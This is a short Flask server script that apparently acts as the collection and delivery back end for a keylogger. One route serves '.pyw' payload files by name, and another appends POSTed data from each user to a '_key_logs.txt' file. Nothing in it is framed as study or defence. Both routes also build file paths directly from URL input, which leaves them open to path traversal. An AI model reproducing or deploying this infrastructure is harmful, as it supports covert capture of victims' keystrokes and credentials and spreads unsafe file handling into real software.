from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/<payload>', methods = ['GET'])
def get_payloads(payload):
    with open(f'payloads/{payload}.pyw', 'r') as f:
        return f.read()


@app.route('/log/<user>', methods = ['POST'])
def upload_file(user):
    if request.method == 'POST':
        with open(f"{user}_key_logs.txt", "a") as f:
            f.write(request.data.decode())
            f.write("\n" + "="*50 + "\n")
    return 'ok', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0')
